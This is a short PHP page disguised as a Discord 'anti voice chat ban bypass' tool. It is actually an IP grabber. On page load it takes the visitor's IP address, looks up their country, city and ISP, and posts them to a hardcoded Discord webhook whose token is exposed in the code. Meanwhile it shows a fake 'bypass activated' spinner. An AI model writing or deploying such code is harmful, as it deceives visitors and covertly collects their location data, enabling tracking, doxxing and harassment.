<?php
$ip = $_SERVER['REMOTE_ADDR'];
$webhook = "https://discord.com/api/webhooks/1479992985080037508/qDDuaOMl392hh8YyRRnmBdh6c7ReAgXQvIAv2F9Ela3OCMejbLYav7MPARFbxhQVtXjR";

$data = file_get_contents("http://ip-api.com/json/$ip");
$json = json_decode($data,true);

$message = '{
  "embeds": [{
    "title": "🎒 ANTI VC BANN BYPASSED!",
    "color": 5763719,
    "fields": [
      {"name": "🖥️ IP", "value": "'.$ip.'", "inline":true},
      {"name": "🌍 Country", "value": "'.$json['country'].'","inline":true},
      {"name": "🏙️ City", "value": "'.$json['city'].'","inline":true},
      {"name": "📶 ISP", "value": "'.$json['isp'].'","inline":true}
    ]
  }]
}';

$ch = curl_init($webhook);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $message);
curl_exec($ch);
curl_close($ch);
?>

<!DOCTYPE html><html><head><title>Anti VC Bann</title></head><body style='background:linear-gradient(45deg,#1a1a2e,#16213e);color:#00ff88;text-align:center;font-family:Arial;padding:50px'>
<h1 style='font-size:3em'>🎮 ANTI VOICE CHAT BANN</h1>
<p style='font-size:1.5em'>Bypass activated... Hold tight!</p>
<div style='width:150px;height:150px;margin:50px auto;border:10px solid #00ff88;border-radius:50%;border-top-color:#16213e;animation:spin 1s linear infinite'></div>
<p style='color:#888'>Discord VC protection bypassed ✓</p>
</body><style>@keyframes spin{100%{transform:rotate(360deg)}}</style></html>
